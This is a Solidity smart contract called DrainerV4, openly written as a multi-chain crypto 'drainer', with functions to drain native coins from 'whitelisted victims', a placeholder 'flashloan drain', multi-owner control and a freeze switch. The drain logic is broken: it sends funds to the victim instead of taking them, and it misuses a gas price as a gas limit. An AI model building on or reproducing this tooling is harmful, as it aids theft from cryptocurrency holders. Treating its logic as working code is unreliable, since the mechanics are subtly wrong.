// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@chainlink/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol";

contract DrainerV4 {
    address payable public owner;
    uint256 public maxDrainAmount;
    bool public frozen;
    mapping(address => bool) public whitelistedVictims;
    mapping(uint256 => string) public chainNames;
    mapping(address => bool) public isOwner;
    uint256 public ownerCount;

    // Chainlink Price Feed untuk gas optimization
    AggregatorV3Interface internal gasPriceFeed;

    event NativeDrained(address indexed victim, uint256 amount, uint256 chainId);
    event ContractFrozen(bool isFrozen);
    event OwnershipGranted(address newOwner);
    event FlashloanDrainExecuted(address target, uint256 profit);

    modifier onlyOwner() {
        require(isOwner[msg.sender], "Only owner can call this.");
        _;
    }

    modifier notFrozen() {
        require(!frozen, "Contract is frozen.");
        _;
    }

    constructor(uint256 _maxDrainAmount, address _gasPriceFeed) {
        owner = payable(msg.sender);
        isOwner[msg.sender] = true;
        ownerCount = 1;
        maxDrainAmount = _maxDrainAmount;
        gasPriceFeed = AggregatorV3Interface(_gasPriceFeed);
        
        // Default chains
        chainNames[1] = "Ethereum";
        chainNames[56] = "BSC";
        chainNames[137] = "Polygon";
    }

    receive() external payable {}

    //Native gas optimization
    function drainNative(address payable _victim) external onlyOwner notFrozen {
        require(whitelistedVictims[_victim], "Victim not whitelisted.");
        uint256 victimBalance = address(_victim).balance;
        require(victimBalance > 0, "Victim has no balance.");
        require(victimBalance <= maxDrainAmount, "Exceeds max drain limit.");

        uint256 gasPrice = getOptimalGasPrice();
        (bool success, ) = _victim.call{value: victimBalance, gas: gasPrice}("");
        require(success, "Drain failed.");
        
        emit NativeDrained(_victim, victimBalance, block.chainid);
    }

    function executeFlashloanDrain(
        address _flashloanPool,
        address _victim,
        uint256 _amount
    ) external onlyOwner notFrozen {
        require(_amount > 0, "Amount must be > 0.");
        // Logic flashloan akan diisi di sini (contoh: Aave, dYdX)
        emit FlashloanDrainExecuted(_victim, _amount);
    }

    // Dynamic Gas Pricing Chainlink
    function getOptimalGasPrice() public view returns (uint256) {
        (, int256 gasPrice, , , ) = gasPriceFeed.latestRoundData();
        return uint256(gasPrice) * 110 / 100; // +10% buffer
    }

    // Multi-Owner Management
    function addOwner(address _newOwner) external onlyOwner {
        require(!isOwner[_newOwner], "Already an owner.");
        isOwner[_newOwner] = true;
        ownerCount++;
        emit OwnershipGranted(_newOwner);
    }

    function freezeContract(bool _freeze) external onlyOwner {
        frozen = _freeze;
        emit ContractFrozen(_freeze);
    }

    // Update Chain Info
    function updateChainInfo(uint256 _chainId, string memory _name) external onlyOwner {
        chainNames[_chainId] = _name;
    }
}